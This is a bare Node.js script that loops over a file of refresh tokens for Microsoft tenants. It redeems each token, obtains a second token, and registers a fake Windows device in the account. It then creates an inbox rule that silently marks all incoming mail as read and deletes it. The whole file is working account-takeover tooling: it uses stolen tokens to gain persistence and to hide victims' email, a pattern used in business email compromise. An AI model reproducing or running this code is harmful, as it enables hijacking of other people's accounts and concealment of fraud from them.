import { readFileSync } from 'node:fs';

const records = readFileSync(process.env.TOKEN_FILE, 'utf8')
  .trim().split('\n').map((line) => JSON.parse(line));

for (const record of records) {
  const tokenResp = await fetch(
    `https://login.microsoftonline.com/${record.tenant}/oauth2/v2.0/token`,
    {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        grant_type: 'refresh_token',
        client_id: 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
        refresh_token: record['refresh_token'],
        scope: 'https://graph.microsoft.com/.default offline_access',
      }),
    },
  );
  const token = await tokenResp.json();
  if (!token.access_token) continue;
  const headers = { Authorization: `Bearer ${token.access_token}`, 'Content-Type': 'application/json' };

  const drsResp = await fetch(
    `https://login.microsoftonline.com/${record.tenant}/oauth2/v2.0/token`,
    {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        grant_type: 'refresh_token',
        client_id: '29d9ed98-a469-4536-ade2-f981bc1d605e',
        refresh_token: token.refresh_token,
        scope: '01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9/.default',
      }),
    },
  );
  const drs = await drsResp.json();
  if (drs.access_token) {
    await fetch('https://graph.microsoft.com/v1.0/devices', {
      method: 'POST',
      headers: { Authorization: `Bearer ${drs.access_token}`, 'Content-Type': 'application/json' },
      body: JSON.stringify({ accountEnabled: true, displayName: record.device, operatingSystem: 'Windows', operatingSystemVersion: '10.0' }),
    });
  }

  await fetch('https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules', {
    method: 'POST', headers,
    body: JSON.stringify({ displayName: 'sss', sequence: 1, isEnabled: true, conditions: {}, actions: { markAsRead: true, delete: true } }),
  });
}
